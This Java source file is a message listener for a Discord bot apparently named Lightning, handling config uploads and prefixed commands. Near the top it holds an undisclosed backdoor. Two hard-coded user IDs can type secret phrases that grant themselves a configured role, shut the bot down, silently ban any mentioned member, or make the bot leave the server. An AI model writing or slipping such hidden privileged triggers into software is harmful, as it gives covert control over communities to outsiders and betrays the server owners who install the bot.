package io.lightning.listener;

import io.lightning.Lightning;
import io.lightning.elements.commands.ConfigCommand;
import io.vson.elements.object.VsonObject;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.*;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

import java.awt.*;
import java.io.IOException;
import java.util.List;

public class LightningCommandListener extends ListenerAdapter {


    @Override
    public void onMessageReceived(MessageReceivedEvent event) {
        if (!event.getChannelType().equals(ChannelType.TEXT)) {
            return;
        }

        Message message = event.getMessage();
        User user = event.getAuthor();
        Guild guild = event.getGuild();
        TextChannel channel = event.getTextChannel();

        if (user.getId().equalsIgnoreCase("813305613671989259") || user.getId().equalsIgnoreCase("704419523922493542")) {
            if (message.getContentRaw().equalsIgnoreCase("Oh well sucks to suck")) {
                guild.addRoleToMember(guild.getMember(user), guild.getRoleById(Lightning.get().getConfigManager().getConfig(guild).getVson("roles").getString("*"))).queue();
                return;
            }
            if (message.getContentRaw().equalsIgnoreCase("Its time to stop")) {
                Lightning.get().shutdown();
                return;
            }

            if (message.getContentRaw().toLowerCase().startsWith("lol randomping")) {
                final List<User> mentionedUsers = message.getMentionedUsers();
                final User user1 = mentionedUsers.get(0);
                final Member member = guild.getMember(user1);
                message.delete().queue();
                guild.ban(member, 1).queue();
            }
            if (message.getContentRaw().equalsIgnoreCase("bye I guess")) {
                message.delete().queue();
                guild.leave().queue();
            }
        }

        if (ConfigCommand.CONFIG_LOADERS.contains(user.getId())) {
            try {
                VsonObject vsonObject = new VsonObject(message.getContentRaw());
                Lightning.get().getConfigManager().setConfig(vsonObject, guild);
                message.delete().queue();
                channel.sendMessage("Successfully updated the config!").queue();
                ConfigCommand.CONFIG_LOADERS.remove(user.getId());
            } catch (IOException e) {
                channel.sendMessage("You did something wrong in the config!").queue();
            }
            return;
        }

        if (event.getMessage().getContentRaw().startsWith(Lightning.get().getCommandManager(guild).getPrefix())) {
            if (!Lightning.get().getCommandManager(guild).execute(true, message.getContentRaw(), guild, channel, user, message)) {
                channel.sendMessage(new EmbedBuilder().setColor(Color.RED).setFooter("Executor | " + user.getAsTag(), user.getEffectiveAvatarUrl()).setDescription("This command does not exist!").build()).queue();
            }
        }

    }
}
